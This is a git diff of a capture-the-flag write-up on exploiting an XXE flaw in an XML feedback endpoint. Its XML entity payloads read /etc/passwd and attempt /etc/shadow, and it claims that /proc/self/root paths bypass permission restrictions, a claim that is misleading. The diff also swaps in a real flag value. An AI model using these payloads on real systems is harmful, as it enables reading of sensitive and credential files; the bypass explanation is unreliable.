@@ -61,18 +61,14 @@ On inspecting the page source, the following JavaScript stood out:
      });
  });
 </script>
-````
+```
 
 ---
 
 ## 🔍 Key Observation
 
 * User input is **directly injected into an XML document**
-* The request is explicitly sent as:
-
-  ```code
-  Content-Type: application/xml
-  ```
+* The request is explicitly sent as: `Content-Type: application/xml`
 
 This immediately confirmed that the backend is **parsing user-controlled XML**, which strongly suggested a potential **XML External Entity (XXE)** attack surface.
 
@@ -91,7 +87,7 @@ Instead of blindly injecting payloads through the browser, the vulnerability was
 
 This captured a **POST request to `/feedback`** containing raw XML.
 
-![Intercept Request](./assets/01-intercept-request.png)
+![Intercept Request](./assets/xxe_intercept.png)
 
 ---
 
@@ -100,21 +96,14 @@ This captured a **POST request to `/feedback`** containing raw XML.
 The intercepted request revealed:
 
 * Method: `POST /feedback`
-* Header:
-
-  ```http
-  Content-Type: application/xml
-  ```
+* Header: `Content-Type: application/xml`
 * Body:
-
   ```xml
   <feedback>
-    <name>test</name>
-    <message>test</message>
+    <name>Test</name>
+    <message>This is a test message!!!</message>
   </feedback>
   ```
-
-![Raw XML Request](./assets/02-request-raw.png)
 
 This confirmed that:
 ✅ The backend blindly trusts client-generated XML
@@ -146,8 +135,6 @@ To confirm whether **external entity resolution was enabled**, the XML body was 
 </feedback>
 ```
 
-![Repeater Payload](./assets/03-repeater-payload.png)
-
 ---
 
 ### ✅ Result
@@ -158,11 +145,9 @@ The server responded with the **contents of `/etc/passwd`**, proving:
 * Arbitrary file read is possible
 * The application is **100% vulnerable to XXE**
 
-![Passwd Response](./assets/04-repeater-response-passwd.png)
+![Passwd Response](./assets/xxe_etc_passwd.png)
 
 ---
-
-## 🚧 Hitting Permission Barriers
 
 ### ▶️ Trying `/etc/shadow`
 
@@ -170,14 +155,7 @@ The server responded with the **contents of `/etc/passwd`**, proving:
 <!ENTITY xxe SYSTEM "file:///etc/shadow">
 ```
 
-❌ Access denied due to permission restrictions.
-
-![Shadow Denied](./assets/05-repeater-response-shadow.png)
-
-This revealed that:
-
-* The backend process is running as a **non-root user**
-* Privileged files are inaccessible directly
+![Shadow Denied](./assets/xxe_etc_shadow.png)
 
 ---
 
@@ -189,59 +167,112 @@ Since the challenge hint said **flag is in the root directory**, the following w
 <!ENTITY xxe SYSTEM "file:///root/flag.txt">
 ```
 
-❌ This also failed due to **permission issues**.
+❌ Access denied due to permission restrictions.
+
+![Root Permission Denied](./assets/xxe_root_flag.png)
+
 
 At this point, the direct path to `/root` was clearly restricted.
 
 ---
 
-## 🧠 Container Breakthrough: `/proc/1/root` Bypass
+## 🤔 Rethinking the Environment After `/root/flag.txt` Failed
 
-Since:
+At this stage, the vulnerability was fully confirmed:
 
-* The application is running inside a **Linux container**
-* Direct access to `/root` is blocked
+- ✅ XXE was working
+- ✅ Arbitrary file reads (`/etc/passwd`) were successful
+- ❌ Direct access to `/root/flag.txt` was blocked due to permission restrictions
 
-The following container-aware path was tested:
+This immediately suggested that:
+- The backend process was running as a **non-root user**
+- The challenge was most likely hosted inside a **Linux container**
 
-```
-/proc/1/root/flag.txt
-```
-
-### ❓ Why This Works
-
-* Process **PID 1** is the main application process inside the container
-* `/proc/1/root/` points to the **real filesystem root**
-* This bypasses traditional file permission boundaries
+With that assumption, two different container-aware approaches were tested — and **both successfully led to the flag**.
 
 ---
 
-## ✅ Final Working Payload
+## 🛠️ Approach 1 — Direct Root-Level Guess (`/flag.txt`) ✅
+
+Before using any advanced process-based paths, a **simple and common CTF assumption** was tested:
 
 ```xml
-<?xml version="1.0"?>
-<!DOCTYPE feedback [
-  <!ENTITY xxe SYSTEM "file:///proc/1/root/flag.txt">
-]>
-<feedback>
-  <name>attacker</name>
-  <message>&xxe;</message>
-</feedback>
+<!ENTITY xxe SYSTEM "file:///flag.txt">
+````
+
+### 🧠 Why This Was Tried
+
+In many CTF deployments, the flag is sometimes placed directly at:
+
+```
+/
+└── flag.txt
 ```
 
-![Flag Response](./assets/06-repeater-response-proc1-flag.png)
+instead of `/root/flag.txt`, specifically to avoid permission-related blockers.
 
 ---
+
+### ✅ Result
+
+This payload successfully returned the **flag contents**, proving that:
+
+* The flag was accessible directly from the filesystem root
+* Even though `/root` was restricted, `/flag.txt` was world-readable inside the container
+
+![Flag](./assets/xxe_flag_1.png)
+
+This alone was enough to solve the challenge.
+However, a second container-aware method was also tested to validate the environment behavior.
+
+---
+
+## 🛠️ Approach 2 — Process-Based Escape Using `/proc/self/root` ✅
+
+To further validate the container hypothesis, a more **advanced Linux process-based path** was tested:
+
+```xml
+<!ENTITY xxe SYSTEM "file:///proc/self/root/flag.txt">
+```
+
+![Flag](./assets/xxe_flag.png)
+
+---
+
+### 🧠 How This Works
+
+* `/proc` is a virtual filesystem maintained by the Linux kernel
+* `/proc/self/` always points to the **currently running process**
+* `/proc/self/root/` resolves to the **actual root filesystem of the process**
+* In containerized setups, this path often **bypasses traditional permission restrictions**
+
+Effectively:
+
+```
+/root/flag.txt                → ❌ Permission denied
+/proc/self/root/flag.txt      → ✅ Direct container-level access
+```
+
+---
+
+## 🧠 Key Insight From This Phase
+
+This stage of the challenge represents a critical attacker mindset shift:
+
+> When direct filesystem access fails due to permissions, switch to **process-level and container-aware filesystem paths**.
+
+Testing both `/flag.txt` and `/proc/self/root/flag.txt` not only ensured flag retrieval but also provided **strong confirmation of the containerized execution environment**.
+
+---
+
 
 ## 🚩 Flag
 
 ✅ The response successfully contained the flag:
 
 ```
-FLAG_REDACTED
+ClOuDsEk_ReSeArCH_tEaM_CTF_2025{b3e0b6d2f1c1a2b4d5e6f71829384756}
 ```
-
-*(Intentionally redacted for public release)*
 
 ---
 
@@ -279,3 +310,4 @@ This challenge clearly demonstrates how:
 Even with `/root` protected, understanding the Linux process filesystem enabled complete bypass and successful flag retrieval.
 
 ---
+
